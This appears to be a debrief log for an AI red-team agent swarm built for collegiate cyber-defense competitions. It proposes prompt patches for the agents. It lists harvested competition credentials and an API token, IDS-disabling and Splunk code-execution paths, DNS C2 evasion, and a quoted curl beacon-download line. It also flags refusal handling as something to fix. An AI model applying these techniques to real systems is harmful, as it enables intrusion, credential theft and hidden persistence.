# Debrief Queue — Training Run Findings

Maintained by: TRAIN-002 (Training Evaluator), dispositioned by operator, consumed by TRAIN-003 (Prompt Patcher)
Purpose: Structured list of issues identified during a training run, each with a disposition category that determines the corrective action. After operator review and disposition confirmation, items marked PROMPT-FIX, TEMPLATE-FIX, or WORKFLOW-FIX are sent to TRAIN-003 for patch generation.

---

## Active Debrief

Source run: PCAP Analysis — 2026-inv6 (manual findings, no /training-run)
Date: 2026-03-16
Operator: —
Status: CLOSED — patch-20260316-4.md generated

---

Previous debrief: PCAP Analysis — 2026-inv2 | Status: CLOSED — patch-20260316-3.md generated

---

## Disposition Legend

PROMPT-FIX: a competition agent's system prompt needs a correction (add knowledge, fix command template, adjust decision framework, improve refusal handling).

TEMPLATE-FIX: a coordination file template needs revision (add/rename column, change status values, adjust format, add documentation).

WORKFLOW-FIX: a slash command workflow needs adjustment (change agent invocation order, add verification step, modify output format, adjust handoff).

OPERATOR-TRAINING: the operator needs to learn something — not a swarm issue (tool usage, workflow optimization, expectation alignment).

WONTFIX: acceptable limitation — document the manual fallback. Operator provides rationale.

NEEDS-TRIAGE: unclear categorization — requires operator discussion to disposition.

---

## Findings

<!-- ===== 2026-inv2 DEBRIEF (2026-03-16) ===== -->

### Finding #13

Disposition: PROMPT-FIX
Agent: EXPLOIT-001
Severity: BLOCKING
Category: RECOMMENDATION-QUALITY

Description: EXPLOIT-001 has no knowledge of Keycloak IAM as a credential spray target. inv2 confirmed Keycloak on .103:8080 exposes user credentials in cleartext HTTP POST bodies. 21 unique user/password pairs were harvested, all shared identically across all 32 teams. `popcorn1?` hits 3 accounts simultaneously. This is the highest-yield credential spray target ever observed across all three PCAP analyses.
Evidence: 21 cleartext credential pairs extracted from inv2 Keycloak POST traffic to /realms/master/protocol/openid-connect/token. Identical user accounts (ajordan, arexford, cbaines, codom, dlopez, epark, eyu, flin, gcruz, hzhang, jteller, kkashani, knixon, lchoi, macosta, mcole, menwright, mrodriguez, oaziz, rnormandy, rpatel) confirmed across 32 teams. popcorn1? shared by mcole, jteller, mrodriguez. Competition-themed password: OMGaTREX1?.
Root cause: Keycloak not in prior PCAP data; first appearance in inv2. No Keycloak entry in EXPLOIT-001 prompt.
Proposed fix: Add "Keycloak IAM Service — Credential Spray Target" section to EXPLOIT-001 with spray endpoint, all 21 user accounts, top-10 priority passwords (popcorn1? first), admin console paths, and post-auth attack paths (user enumeration, password reset, OIDC token forge).

---

### Finding #14

Disposition: PROMPT-FIX
Agent: EXPLOIT-001
Severity: HIGH
Category: RECOMMENDATION-QUALITY

Description: EXPLOIT-001 has no knowledge of Graylog as an attack target. inv2 introduced Graylog on .170:9000 as the per-team SIEM. The scoring engine's API token was captured in cleartext HTTP Basic Auth and is identical across all 32 teams. This token gives direct API access to search logs, modify stream alerts (suppressing blue team notifications), and add log inputs (potential persistence). Attack looks identical to scoring engine traffic — extremely low detection risk.
Evidence: Graylog scoring token `12afjthotgefe01fv714tec0ag9qeuf3qup9a36bcecicbo11fj0` captured in HTTP Basic Auth header across all 32 teams. API endpoints confirmed: GET /api/search/universal/relative, GET/POST /api/system/inputs. Web login default: admin/admin. Stream modification suppresses blue team alerts.
Root cause: Graylog not in prior PCAP data; first appearance in inv2. Replaces Splunk from inv5.
Proposed fix: Add "Graylog SIEM as Credential Target" section to EXPLOIT-001 with scoring token, API endpoints, web login defaults, and four attack paths. Note scoring advisory: do not rotate the Graylog admin password in a way that invalidates the scoring token.

---

### Finding #15

Disposition: PROMPT-FIX
Agent: EVADE-001
Severity: HIGH
Category: RECOMMENDATION-QUALITY

Description: EVADE-001's "2026 Red Team Signatures to Avoid" section covers HTTP-based C2 (curl beacon) but has no DNS C2 guidance. inv2 revealed a pre-planted DNS C2 running 5-second fixed-interval A queries with hex-encoded subdomains. Only 1/32 human teams detected it in 65 minutes — but an AI blue team would detect the fixed interval and DGA-style subdomains within seconds. EVADE-001 needs to know when DNS C2 is detectable and how to harden it.
Evidence: 2026-inv2 DNS C2 pattern: A queries for [hex_id].[b58_suffix].log.jacobseunglee.com at exactly 5-second intervals via resolver 1.1.1.1. ~78 queries per 60-second file per host. 32 hosts beaconing simultaneously from T=0. Human detection rate: 1/32 in 65 min. AI blue team detection: certain via timing entropy analysis + DGA heuristics.
Root cause: DNS C2 not observed in prior PCAP data; first appearance in inv2. HTTP C2 guidance exists but DNS C2 has different detection surface.
Proposed fix: Add "DNS C2 Beacon Pattern — Signature and Detection Risk" section to EVADE-001. Include: fixed-interval detection risk, DGA subdomain detection risk, recommended mitigations (variable interval 30–120s, non-DGA subdomain format, DNS TXT queries, non-threat-intel domain), and SSH tunnel as preferred alternative.

---

### Finding #16

Disposition: PROMPT-FIX
Agent: RECON-001
Severity: HIGH
Category: RECOMMENDATION-QUALITY

Description: RECON-001 now has quals and inv5 layouts but not inv2. The inv2 layout introduces Keycloak (.103), Graylog (.170), and a dual-web host (.37) not present in either prior event. Without the inv2 layout, RECON-001 cannot recommend immediate targeted scans against Keycloak and Graylog — the two highest-yield new targets. Additionally, inv2 has a shared DC at 10.100.100.12 accessible by all teams — a unique cross-team target not seen before.
Evidence: inv2 traffic confirms: .12=DC (great.cretaceous domain, TREX$ machine), .37=dual-web (WordPress+MediaWiki), .70=app (port 3000/8082), .76=gallery (HTTP/9000), .103=Keycloak+APIs (8080/8000/8001), .104=shop (HTTP/80), .170=Graylog (9000). Shared: 10.100.100.12 accessible to all 32 team subnets. 32 teams, subnets 10.100.101–132.x.
Root cause: Third distinct layout in three events. RECON-001 prompt needs all three patterns plus reinforced "verify first" warning.
Proposed fix: Append "WRCCDC 2026-inv2 Network Layout Pattern" subsection to RECON-001 after the inv5 subsection. Include full address-to-role map, competition domain (great.cretaceous), priority spray targets (.103 Keycloak first, .170 Graylog second), and note about shared 10.100.100.12 DC.

---

### Finding #17

Disposition: PROMPT-FIX
Agent: OPS-001
Severity: MEDIUM
Category: TIMING

Description: OPS-001 has two timing data points (quals: 17min, inv5: 88sec). inv2 adds a third that fills in the middle of the spectrum: no firewall deployed in 65 minutes, but password changes starting at T+21min. This three-point calibration lets OPS-001 reason about Regionals as a range rather than a point estimate. Also introduces a new concept: pre-planted access (DNS C2 from T=0) bypasses all timing windows entirely.
Evidence: inv2 Pass 3: no firewall deployed in 65-minute capture window. Password changes confirmed at T+21min (7 teams). DNS C2 detected by 1/32 teams at T+~12min. Three data points now: quals=17min SSH firewall, inv2=no firewall/65min, inv5=88sec. Pre-planted DNS C2 operated undetected for full 65-minute window on 31/32 teams.
Root cause: Only two timing calibration points existed; inv2 provides the third.
Proposed fix: Append "2026-inv2 Phase Timing Calibration" subsection to OPS-001's timing section. Include three-point response spectrum table, Regionals uncertainty range, pre-planted access note, and Graylog scoring token preservation advisory.

---

### Finding #18

Disposition: PROMPT-FIX
Agent: EVADE-001
Severity: MEDIUM
Category: RECOMMENDATION-QUALITY

Description: EVADE-001 has no pivot scanning technique documented. inv2 confirmed that compromised team hosts (.76 gallery server) were used as masscan pivots to reach internal subnets (192.16.220.0/24) unreachable from the red team jumpbox. This technique bypasses all external IDS and jumpbox IP-based firewall blocks. The caution is that heavy pivot scanning (43K SYNs) generates Graylog alerts if the host is log-shipping.
Evidence: 2026-inv2 traffic shows 10.100.106.76 generating 43,176 SYNs targeting 192.16.220.0/24 in one ~60-second file. Traffic originates from inside the team subnet. Rate consistent with masscan. Not visible in external red team traffic logs. Graylog on .170 would receive syslog from .76 if configured — high-volume scanning would generate visible spike.
Root cause: Pivot scanning not previously documented in EVADE-001; first confirmed in inv2.
Proposed fix: Add "Pivot Scanning via Compromised Team Hosts" section to EVADE-001. Include technique, why it bypasses external IDS, how to execute (upload masscan/nmap to compromised host), and detection risk caveat (use nmap -T2, not masscan, to avoid Graylog volume alerts from inside the subnet).

<!-- ===== END 2026-inv2 DEBRIEF ===== -->

<!-- ===== 2026-inv5 DEBRIEF (2026-03-16) ===== -->

### Finding #7

Disposition: PROMPT-FIX
Agent: RECON-001
Severity: HIGH
Category: RECOMMENDATION-QUALITY

Description: RECON-001's 2026 network layout knowledge covers only the quals schema (.14=DC, .20=WordPress, .22=WinRM). The inv5 invitational used a completely different host-role-per-address map. RECON-001 must be updated to (a) present the inv5 layout as a second known pattern and (b) explicitly warn that host roles change between competition events — the agent must verify layout rather than assuming quals schema.
Evidence: 2026-inv5 traffic confirms: .17=DC (milkfarm), .60=Splunk (Work1), .63=ECommerce, .86=Roundcube (moomail), .98=Windows member, .2=firewall/ntopng. None of these match the quals offsets except .2. Competition domain changed to udderstrength.gym. 26 team subnets (10.100.100–125.0/24) vs quals' 30 teams.
Root cause: Only one year of PCAP data was embedded in RECON-001; a single-year sample created false confidence in a stable layout.
Proposed fix: Append "WRCCDC 2026-inv5 Network Layout Pattern" subsection under RECON-001's Common CCDC Infrastructure Patterns section, after the existing 2026-quals layout. Include full address-to-role map, new priority targets (.60 Splunk, .86 Roundcube, .2 ntopng, .17 DC), domain udderstrength.gym, and a prominent NOTE that layout varies by event — always run a quick targeted scan to confirm before committing to a spray sequence.

---

### Finding #8

Disposition: PROMPT-FIX
Agent: EXPLOIT-001
Severity: BLOCKING
Category: RECOMMENDATION-QUALITY

Description: EXPLOIT-001 has no knowledge of three new scored services confirmed in inv5: Roundcube webmail, Splunk SIEM, and ntopng network monitor. All three use default credentials. Missing these targets means the first 90 seconds of credential spray hits only the quals service set, leaving high-value access ungained before firewall deployment.
Evidence: inv5 traffic shows: Roundcube on .86 hosts (POST /?_task=login, fields _user/_pass/_timezone), Splunk on .60 hosts (port 8000, default admin/changeme), ntopng on .2 hosts (port 443/3000, default admin/admin). Username format changed to lowercase first-initial+lastname (e.g., pyoung). Service accounts moomoo/ceo are scoring-only (not for admin login).
Root cause: No inv5 credential intelligence embedded; EXPLOIT-001 only knows quals service targets.
Proposed fix: Add "2026-inv5 New Credential Targets" section to EXPLOIT-001 covering all three new services with specific login endpoints, POST field formats, default credentials, and the revised username format. Include the Splunk app upload attack path (high value, low noise).

---

### Finding #9

Disposition: PROMPT-FIX
Agent: EVADE-001
Severity: HIGH
Category: RECOMMENDATION-QUALITY

Description: EVADE-001 has no knowledge of ntopng as a blue team monitoring tool deployed in competition networks. inv5 confirmed ntopng runs on .2 hosts and gives blue teams live flow tables, nDPI protocol detection, and anomaly scoring. Without knowing ntopng is present and can be disabled via its own default credentials, EVADE-001 cannot recommend the highest-value evasion action available in the first 90 seconds.
Evidence: inv5 traffic shows red team accessed ntopng on .2 hosts using admin/admin, navigated to /lua/rest/v2/disable/check.lua, and disabled ndpi_http_suspicious_header via POST. Red team also used ntopng's own API (/lua/rest/v2/get/flow/active_list.lua) to monitor their own traffic's alert score. ntopng modifications are logged — only use if blue team appears unaware.
Root cause: ntopng not in EVADE-001's detection surface model; prior data was quals-only which did not include ntopng.
Proposed fix: Add "ntopng Network Monitor — Evasion Technique" section to EVADE-001 with: detection capabilities, default credential access (admin/admin), IDS disable API path and POST payload, self-monitoring technique, and caveat about audit log visibility.

---

### Finding #10

Disposition: PROMPT-FIX
Agent: OPS-001
Severity: BLOCKING
Category: TIMING

Description: OPS-001's current timing model (patched from 2026-quals) sets the initial access window at 2–3 minutes for AI blue team. inv5 data invalidates this: experienced human teams at inv5 deployed firewall rules in 88 SECONDS. This is 12x faster than quals and means the AI-blue-team estimate must be further revised downward to 15–60 seconds. An OPS-001 operating on the 2–3 minute window will recommend sequential sprays when simultaneous parallel launch at T=0 is required.
Evidence: inv5 Pass 3 analysis: fastest team deployed HTTP firewall at T+88s. 83% of teams firewalled within 22 minutes. Active SSH/RDP sessions survived firewall deployment — only new connections were blocked. Current OPS-001 prompt (patched 2026-03-16) still references 2–3 min window.
Root cause: 2026-quals quals was the only timing data when OPS-001 was last patched; inv5 represents more experienced blue teams closer to Regionals skill level.
Proposed fix: Append a "REVISED Phase Timing — AI Blue Team (updated from 2026-inv5)" subsection to OPS-001's existing 2026 timing section. Key changes: initial window 60–90s maximum; launch ALL credential sprays simultaneously at T=0 (do not wait for scan results); active sessions survive firewall — prioritize session establishment and keepalives above all else.

---

### Finding #11

Disposition: PROMPT-FIX
Agent: RECON-001
Severity: MEDIUM
Category: RECOMMENDATION-QUALITY

Description: RECON-001 has no knowledge of VXLAN overlay infrastructure which WRCCDC uses to deliver team networks. If the jumpbox has access to the underlay (10.1.3.x), passive VXLAN monitoring reveals all team subnets and their hosts without generating any traffic toward team hosts — a zero-noise reconnaissance method that bypasses all detection. RECON-001 should check for VXLAN access at session start.
Evidence: inv5 traffic confirms VXLAN (UDP 4789) through 10.1.3.1–6 VTEPs. VNI encoding: VNI 100–125 = team subnets 100–125. Red team VTEP at 10.1.3.20 (VNI 220). This pattern may recur at Regionals.
Root cause: VXLAN not previously observed in PCAP data; first confirmed in inv5.
Proposed fix: Add "VXLAN Overlay Network Pattern" section to RECON-001's scan strategy. Include underlay IP range, VNI-to-team mapping, passive tap technique, and instruction to verify VXLAN access before beginning traditional scanning.

---

### Finding #12

Disposition: PROMPT-FIX
Agent: EXPLOIT-001
Severity: HIGH
Category: RECOMMENDATION-QUALITY

Description: EXPLOIT-001 has no Splunk-specific attack path documented. inv5 confirmed that Splunk with default credentials gives code execution via malicious app upload — a high-value, low-noise vector that persists across Splunk restarts and runs as the Splunk service account (often root). This should be a Tier A quick-win in EXPLOIT-001's playbook whenever Splunk is detected.
Evidence: inv5 traffic shows Splunk app upload POST to /en-US/manager/appinstall/upload_app followed by verification GET to /en-US/splunkd/__raw/services/apps/local/[appname]. Single multipart POST, low noise, looks like normal admin activity. Detection risk LOW.
Root cause: Splunk not previously encountered in PCAP data; first confirmed attack path in inv5.
Proposed fix: Add "Splunk SIEM as Initial Access / Persistence Vector" section to EXPLOIT-001's Quick-Win Service Exploits. Include Attack Path A (malicious app upload with exact URL and verification step) and Attack Path B (search head command injection). Rate as Tier A when Splunk is found with default creds.

<!-- ===== END 2026-inv5 DEBRIEF ===== -->

### Finding #1

Disposition: PROMPT-FIX
Agent: RECON-001
Severity: HIGH
Category: RECOMMENDATION-QUALITY

Description: RECON-001 has no knowledge of the WRCCDC 2026 team subnet layout. Without this, it recommends full blind discovery scans rather than targeted scans against known host positions, wasting the critical early window.
Evidence: 2026-quals traffic confirms all 30 teams use 10.100.1XX.0/24 with identical host-role-per-address scheme (.14=DC, .20=WordPress, .22=WinRM, .2=primary Linux, etc.). RECON-001's current prompt contains no year-specific topology data.
Root cause: PCAP intelligence not yet embedded in agent prompts — this is the first PCAP analysis run.
Proposed fix: Add "WRCCDC 2026 Network Layout Pattern" subsection to RECON-001's system prompt under Common CCDC Infrastructure Patterns. Include full address-to-role map, priority host list (.2, .14, .20, .22), shared segment (10.100.100.0/24), and scoring engine IP (10.2.1.5).

---

### Finding #2

Disposition: PROMPT-FIX
Agent: RECON-001
Severity: HIGH
Category: RECOMMENDATION-QUALITY

Description: RECON-001 recommends masscan-style full-rate scanning with no AI blue team calibration. 2026-quals data shows masscan at ~180 pps triggers SSH firewall within 17 minutes by human teams — an AI blue team will respond in 2–3 minutes, invalidating any scan that takes longer.
Evidence: tshark analysis of 2026-quals PCAPs shows SYN flood signature (paired SYNs within 40μs, window 1024, TTL 36, MSS-only options) and SSH host count drop from 43 → 5 at T+17min. AI blue team equivalent response estimated at 2–3 minutes based on log-correlation capability.
Root cause: RECON-001 has no AI blue team response timing model; defaults to standard CCDC scan cadence.
Proposed fix: Add "Scan Rate Calibration for AI Blue Team" section to RECON-001. Include: no full-rate masscan, use nmap -T2/-T1 against known ports only, leverage known layout to skip discovery, limit to ports 22/80/389/443/445/3389/5985, distribute across multiple source IPs, target completion within 5 minutes.

---

### Finding #3

Disposition: PROMPT-FIX
Agent: EXPLOIT-001
Severity: BLOCKING
Category: RECOMMENDATION-QUALITY

Description: EXPLOIT-001 has no 2026-specific credential intelligence. The 2026 quals established a confirmed working credential, AD domain, username format, password pattern, and spray priority order that are all directly reusable at 2026 Regionals.
Evidence: WordPress admin:WaterIsWet?? verified by scoring engine traffic. Domain rmwpra.hydration confirmed in NTLM spray traffic. AD usernames FIRSTNAME_LASTNAME (all-caps, underscore) observed across 5 spray sources. Password pattern: [ThemeWord][Adjective][SpecialChars]. SSH spray window: T+0 to T+15min before firewall deployment.
Root cause: No prior PCAP analysis had been run; credential intelligence not embedded.
Proposed fix: Add "2026 Competition Credential Intelligence" section to EXPLOIT-001. Include domain, confirmed credential, password pattern, AD username format with examples, service accounts (Administrator, backup), and prioritized spray order (SSH first → LDAP/SMB → WordPress → WinRM). Add note about scoring engine: do not change admin:WaterIsWet?? password on compromised WordPress hosts.

---

### Finding #4

Disposition: PROMPT-FIX
Agent: EVADE-001
Severity: HIGH
Category: RECOMMENDATION-QUALITY

Description: EVADE-001 lacks specific 2026 red team traffic signatures that the AI blue team will have been trained on. Without these, EVADE-001 cannot warn the operator away from burned patterns or recommend specific mitigations.
Evidence: Four distinct burned signatures identified in 2026-quals PCAPs: (1) masscan TCP fingerprint (window 1024, TTL 36, paired SYNs), (2) curl C2 beacon (GET /JSyausLR/LinIUpdater, periodic ~30–60s), (3) NTLM spray clustering (10+ sources, same timestamps, port 389), (4) WinRM POST /wsman from non-admin IP.
Root cause: No prior PCAP analysis; burned signatures not documented in agent prompts.
Proposed fix: Add "2026 Red Team Signatures to Avoid (BURNED PATTERNS)" section to EVADE-001. Include all four signatures with specific TCP/HTTP field values, detection likelihood against AI blue team, and per-signature mitigations. Add AI-specific general mitigations: vary scan source IPs per team, HTTPS C2 only, browser UA strings, legitimate-looking paths.

---

### Finding #5

Disposition: PROMPT-FIX
Agent: OPS-001
Severity: BLOCKING
Category: TIMING

Description: OPS-001's phase timing model is calibrated for human blue teams (~17 minute SSH response window). Against an AI blue team, this model produces catastrophically wrong time budgets — the actual initial access window is 2–3 minutes, not 17. An OPS-001 operating with the wrong timing model will recommend spending time on discovery when the window has already closed.
Evidence: 2026-quals: SSH firewall deployed at T+17min by human teams. AI blue team log-correlation capability implies 2–3 minute equivalent. Current OPS-001 prompt references CCDC defaults with no AI blue team timing adjustment.
Root cause: No AI blue team timing model exists in OPS-001; defaults to human-defender assumptions.
Proposed fix: Add "2026 Competition Phase Timing" section to OPS-001. Include the full observed 2026 quals timeline, adjusted AI blue team timeline (T+0–3min undetected window, T+5min window closes), and recommended three-phase structure: Phase 1 (T+0–5, ultra-fast targeted credential spray), Phase 2 (T+5–30, exploit + encrypted persistence), Phase 3 (T+30+, encrypted channels only).

---

### Finding #6

Disposition: PROMPT-FIX
Agent: PERSIST-001
Severity: HIGH
Category: RECOMMENDATION-QUALITY

Description: PERSIST-001 may recommend or fail to warn against HTTP-based implant delivery (curl download + cron execution), which is the exact technique used in 2026 quals. This technique is trivially detected by an AI blue team within 2 minutes and would result in rapid persistence removal.
Evidence: 2026-quals: curl http://10.230.87.61/JSyausLR/LinIUpdater ELF beacon at ~30–60s intervals ran undetected for 115 minutes against HUMAN teams. AI blue team HTTP log correlation would flag this immediately. No current warning in PERSIST-001 about this pattern.
Root cause: 2026 quals technique is not documented as burned in PERSIST-001; agent has no AI-blue-team-specific persistence guidance.
Proposed fix: Add "2026 Quals Persistence Technique — DO NOT REUSE" section to PERSIST-001. Document the exact technique, explain the four reasons it fails against AI blue team (HTTP logging, periodic beacon signature, no encryption, ELF-over-HTTP flagging), and provide preferred alternatives: SSH authorized_keys injection, cron with existing binaries, systemd oneshot service, SSH tunneling for C2, HTTPS C2 with jittered timing and browser UA.

<!-- TRAIN-002 appends findings here using this format:

### Finding #N

Disposition: [PROMPT-FIX | TEMPLATE-FIX | WORKFLOW-FIX | OPERATOR-TRAINING | NEEDS-TRIAGE]
Agent: {agent ID}
Severity: [BLOCKING | HIGH | MEDIUM | LOW]
Category: [REFUSAL | COMMAND-ACCURACY | COORDINATION | TIMING | RECOMMENDATION-QUALITY]

Description: {what happened}
Evidence: {the specific command, refusal text, or inconsistency}
Root cause: {assessment of why this happened}
Proposed fix: {recommendation for how to address it}

-->

---

<!-- ===== 2026-inv6 DEBRIEF (2026-03-16) ===== -->

### Finding #19

Disposition: PROMPT-FIX
Agent: RECON-001
Severity: HIGH
Category: RECOMMENDATION-QUALITY

Description: RECON-001 has no knowledge of the 2026-inv6 network layout, which is entirely new (three-digit last octets: .9, .105, .134, .203, .253 instead of .14/.17/.12 DC patterns). The sub-14-second firewall deployment means there is zero time for port scanning — RECON-001 must operate from pre-loaded layout knowledge at T=0.
Evidence: tshark SYN/SYN-ACK analysis of 10.2.1.5 scoring engine traffic to all 45 team subnets confirmed .9=Windows domain host (FTP/21, RDP/3389, SMB/445, WinRM/5985), .134=chat app (/api/login), .203=SSO/webmail (/sso/login, /webmail/), .253=Gitea (port 80+3000). FTP SYN-ACK count dropped from 76 to 0 within 14 seconds of competition start.
Root cause: inv6 introduced an entirely new host layout not present in any prior competition. No inv6 entry in RECON-001 prompt.
Proposed fix: Add "WRCCDC 2026-inv6 Network Layout" section to RECON-001 with full host role map, priority target list, STAR-BARS domain/KYLOREN$ DC hostname, VXLAN VNI formula (100 + team number), and warning that sub-14-second firewall makes scanning impossible — must use pre-loaded layout.

---

### Finding #20

Disposition: PROMPT-FIX
Agent: EXPLOIT-001
Severity: BLOCKING
Category: RECOMMENDATION-QUALITY

Description: EXPLOIT-001 has no knowledge of 30 Star Wars character credentials for the 2026-inv6 competition, the blue team password reset templates (rainbowandhearts23012[user] and [Word]-[Word]-[Word]-Dajda213), or the new service login endpoints (SSO/webmail POST /sso/login, chat app POST /api/login JSON).
Evidence: 70+ cleartext email/password pairs extracted from scoring engine HTTP POST traffic to /sso/login and /api/login endpoints. All 45 teams share identical original credentials. Blue team reset pattern rainbowandhearts23012maul, rainbowandhearts23012yoda, etc. confirmed across multiple teams via repeated successful authentication events after password change traffic.
Root cause: inv6 introduced new theme-specific credentials, new service types, and a blue team reset template that enables second-wave spraying.
Proposed fix: Add "2026-inv6 Credential Intelligence" section to EXPLOIT-001 with full 30-account credential list, SSO and chat app login endpoints, blue team reset templates for second-wave spraying at T+5 min, and credential reuse note (.134 and .203 share same passwords).

---

### Finding #21

Disposition: PROMPT-FIX
Agent: OPS-001
Severity: BLOCKING
Category: TIMING

Description: OPS-001's phase timing model has a T+90-second initial window from inv5. inv6 collapsed this to 14 seconds — 6x faster. The current "T+0 to T+90sec" sprint window is fatally optimistic for an AI-assisted blue team with pre-staged firewall scripts.
Evidence: FTP blocked at T+14 sec across all 45 teams; SSH availability dropped 98.2% by T+2 minutes. Red team C2 pre-planted before competition start was the only channel active indefinitely. Scoring engine source IPs (10.2.1.5, 10.193.43.23, etc.) remained whitelisted throughout. No new connections from jumpbox IPs successful after T+14 sec.
Root cause: Blue team firewall response time is converging toward near-zero with automation. The inv5 88-second window was a transient data point; inv6 shows the asymptote.
Proposed fix: Add "Sub-14-Second Firewall Deployment (2026-inv6)" section to OPS-001 updating the timing spectrum table (quals=17 min, inv2=no firewall, inv5=88 sec, inv6=14 sec), revising operational phases to reflect T+0–14 sec sprint window, and identifying three viable channels that bypass the firewall: pre-planted C2, scoring-whitelisted HTTP services (.203/.134/.253), and active session preservation.

---

### Finding #22

Disposition: PROMPT-FIX
Agent: EVADE-001
Severity: HIGH
Category: RECOMMENDATION-QUALITY

Description: EVADE-001 does not track kalipatriot.net as a recurring red team C2 infrastructure domain. This domain appeared in both inv2 and inv6 — it is confirmed recurring WRCCDC red team infrastructure that an AI blue team would detect immediately via TI feeds. Additionally, the C2 spreading behavior (7→33 hosts) is a new pattern EVADE-001 should understand.
Evidence: DNS query extraction from inv6 sampled pcap files shows ccdc.kalipatriot.net, packages.linuxsnapd.com, tavern.kalipatriot.net as primary C2 domains with 3–4 second beacon intervals. 7 hosts beaconing at T=0 grew to 33 by T+11 min. kalipatriot.net also present in inv2 (log.jacobseunglee.com used a different domain but same pattern).
Root cause: EVADE-001 tracks burned signatures from quals/inv5/inv2 but has no recurring-infrastructure category for multi-competition patterns.
Proposed fix: Add "kalipatriot.net DNS C2 — Recurring Infrastructure (inv2 + inv6)" section to EVADE-001 documenting all four known C2 domains, beacon pattern (3–4 sec interval, base32 subdomain labels), spreading behavior, and AI blue team detection risk (DGA scoring + behavioral analysis would flag within 60 seconds).

---

### Finding #23

Disposition: PROMPT-FIX
Agent: EXPLOIT-001
Severity: HIGH
Category: RECOMMENDATION-QUALITY

Description: EXPLOIT-001 has no knowledge of Gitea as a scored service in WRCCDC. inv6 introduced Gitea v1.21.1 on .253 hosts as a scored service where issue/PR state affects competition scoring. EXPLOIT-001 needs attack paths for this service type.
Evidence: Scoring engine (10.2.1.5) sends GET requests to /star-bars/galactic-credits-terminal/issues and /star-bars/starbars-database/pulls. Gitea v1.21.1 confirmed from asset build hash c31a1cdb3d3bb9f5e0f9. SSO character account credentials observed reused on Gitea login pages.
Root cause: Gitea is a new service type not present in any prior WRCCDC competition analyzed. No Gitea entry in EXPLOIT-001.
Proposed fix: Add "Gitea Self-Hosted Git as Scored Service" section to EXPLOIT-001 with service layout (.253:80+3000), scoring mechanism (issues/PRs), attack paths (credential spray using character accounts, API user enumeration, repository manipulation, server-side hooks), and CVE note for v1.21.1.

---

### Finding #24

Disposition: PROMPT-FIX
Agent: PERSIST-001
Severity: HIGH
Category: RECOMMENDATION-QUALITY

Description: PERSIST-001 does not recognize DNS C2 pre-planting as a recurring red team technique. This technique has appeared in two consecutive invitational events (inv2, inv6), provides C2 that is active at T=0 before any firewall deployment, remains undetected by human blue teams in both captures, and self-propagates across the environment. It is the single highest-ROI persistence technique observed across all four PCAP analyses.
Evidence: inv6: 7 beaconing hosts at T=0 → 33 hosts at T+11 min; FTP firewall deployed at T+14 sec but DNS C2 unaffected throughout 12.6-min capture. inv2: DNS C2 on all 32 DCs from T=0; undetected in 65-min capture window (only 1/32 teams detected after 12 min). Combined: 2/2 events confirm undetected persistence through firewall deployments.
Root cause: PERSIST-001's current prompt lists SSH keys and cron alternatives to the burned curl/cron pattern but does not describe pre-competition DNS C2 deployment as a persistence strategy.
Proposed fix: Add "DNS C2 Pre-Planting Pattern — Recurring High-ROI Persistence" section to PERSIST-001 documenting the recurring domains (kalipatriot.net, linuxsnapd.com), spreading behavior, evasion properties (bypasses all firewall responses), and evasion recommendations (variable beacon intervals, legitimate-looking domains, DNS TXT records over A records).

---

---

<!-- ===== 2026-inv3 DEBRIEF (2026-03-17) ===== -->

## Active Debrief

Source run: PCAP Analysis — 2026-inv3 (manual findings, no /training-run)
Date: 2026-03-17
Operator: —
Status: CLOSED — patch-20260317-5.md generated

---

### Finding #25

Disposition: PROMPT-FIX
Agent: RECON-001
Severity: HIGH
Category: TOPOLOGY-KNOWLEDGE

Description: RECON-001 has no knowledge of the inv3 network layout. 32 teams on 10.100.101–132.0/24. Host-role assignments differ significantly from all prior events — notably two new scored services: Prometheus node_exporter (port 9100) on .5 and Transmission BitTorrent (port 9091) on .111. Competition domain: mindmend.ai / MINDMEND. DC machine account: CORTEX$.
Evidence: Pass 1 tshark extraction from first 3 inv3 PCAPs. Scoring engine at 10.195.168.65 confirmed hitting .5:9100, .111:9091, .103:3306 (MySQL), and .113 (Exchange). MySQL scoring query confirmed: SELECT age FROM scoring.person.
Root cause: No inv3 section exists in RECON-001.
Proposed fix: Add "WRCCDC 2026-inv3 Network Layout (observed 2025-11-15)" section to RECON-001 with all 7 host roles (.5 Prometheus, .35 DC, .37 app server, .97 WinRM, .103 FTP+MySQL, .111 Transmission, .113 Exchange), competition domain/DC details, MySQL scoring query, and tailored nmap command.

---

### Finding #26

Disposition: PROMPT-FIX
Agent: EXPLOIT-001
Severity: BLOCKING
Category: RECOMMENDATION-QUALITY

Description: EXPLOIT-001 has no inv3 credential intelligence. Universal FTP password `FixTheBrain123!` applies to all 7 usernames across all 32 teams. WinRM access via `kliu@MINDMEND` was active at T+9 seconds (pre-staged). This continues the cross-event pattern of a single thematic universal password per competition. Knowing this pattern allows immediate credential spray at T=0.
Evidence: Cleartext FTP traffic (port 21) on .103 hosts shows USER/PASS sequences with FixTheBrain123! for all 7 users (dgonzalez, ajohnson, anguyen, kliu, achi, ATHENA, jsmith). WinRM POST /wsman at T+9s with kliu@MINDMEND observed across 3 sampled files.
Root cause: No inv3 credential section exists in EXPLOIT-001. Cross-event universal password pattern not documented.
Proposed fix: Add "2026-inv3 Credential Intelligence (MindMend theme, observed 2025-11-15)" section to EXPLOIT-001 with universal FTP password, 7-username roster, WinRM endpoint details, MySQL scoring query, and cross-event universal password pattern table (WaterIsWet?? quals, OMGaTREX1? inv2, FixTheBrain123! inv3).

---

### Finding #27

Disposition: PROMPT-FIX
Agent: EVADE-001
Severity: CRITICAL
Category: RECOMMENDATION-QUALITY

Description: EVADE-001 does not document the AD-domain-embedded C2 hostname technique. In inv3, `cortex.mindmend.ai` (a subdomain of the competition's own AD domain) was used for DNS C2 — achieving 0/32 team detection across a 5.5-hour competition window. This is the best evasion result observed across all four analyzed events. The technique is distinct from prior kalipatriot.net C2 because it uses the blue team's own trusted domain space.
Evidence: DNS query extraction shows all 32 teams' .35 DC hosts beaconing to cortex.mindmend.ai from T=0. Competition domain is mindmend.ai — the C2 subdomain is indistinguishable from legitimate AD DNS traffic. 11 red team DNS resolvers (10.192–10.254 range) answered cortex.mindmend.ai queries. 0 RST/block events on port 53 observed in full 5.5-hour capture.
Root cause: EVADE-001 covers kalipatriot.net as a burned external domain but does not document the higher-evasion technique of using the competition domain itself as the C2 namespace.
Proposed fix: Add "Best-Practice C2 Evasion: AD-Domain-Embedded Hostname (inv3, 0% detection in 5.5h)" section to EVADE-001 documenting CORTEX$/cortex.mindmend.ai technique, the pool-of-resolvers pattern, why AD-domain embedding defeats blue team DNS filtering, and comparison to external-domain C2 (kalipatriot.net: HIGH detection risk vs. AD-embedded: LOW detection risk).

